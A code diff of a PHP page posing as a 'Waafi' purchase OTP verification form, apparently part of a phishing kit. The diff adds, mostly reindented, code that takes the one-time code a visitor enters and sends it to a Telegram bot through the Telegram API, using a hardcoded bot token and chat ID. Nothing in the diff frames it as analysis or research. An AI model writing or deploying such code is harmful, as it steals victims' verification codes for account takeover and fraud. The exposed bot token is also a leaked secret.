@@ -292,43 +292,41 @@
 
       <form id="otpForm" action="" method="POST">
         <?php
-       if (isset($_POST['verify'])) {
-      $otp  = trim($_POST['otp_code'] ?? '');
-
-      $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
-      $chatId   = "1135238504";
-
-        $text = "Waafi Website Message\n\n"
-          . "VerifyPurchaseOtp: $otp\n";
-
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-
-    $data = [
-        'chat_id' => $chatId,
-        'text'    => $text
-    ];
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-    $response = curl_exec($ch);
-
-    if ($response === false) {
-        header('Location: error.php');
-        exit;
-    }
-
-    $result = json_decode($response, true);
-
-    if (isset($result['ok']) && $result['ok'] === true) {
-        exit;
-    }
-
-    exit;
-}
+          if (isset($_POST['verify'])) {
+          $otp  = trim($_POST['otp_code'] ?? '');
+    
+          $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
+          $chatId   = "1135238504";
+    
+            $text = "Waafi Website Message\n\n"
+              . "VerifyPurchaseOtp: $otp\n";
+    
+          $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+      
+          $data = [
+              'chat_id' => $chatId,
+              'text'    => $text
+          ];
+      
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, $url);
+          curl_setopt($ch, CURLOPT_POST, true);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+      
+          $response = curl_exec($ch);
+      
+          if ($response === false) {
+              header('Location: error.php');
+              exit;
+          }
+      
+          $result = json_decode($response, true);
+      
+          if (isset($result['ok']) && $result['ok'] === true) {
+          }
+      
+      }
       ?>
         <div class="otp-boxes">
           <input type="text" maxlength="1" inputmode="numeric" />
@@ -345,7 +343,7 @@
         <p class="timer">Hold time: <strong id="countdown">58 s</strong></p>
 
         <div class="btn-wrap">
-          <input name="verify" type="submit" class="verify-btn" id="verifyBtn" value="VERIFY">
+          <button name="verify" type="submit" class="verify-btn" id="verifyBtn" >VERIFY</button>
         </div>
          <p class="error-text" id="errorText">Failed to verify, try again.</p>
       </form>
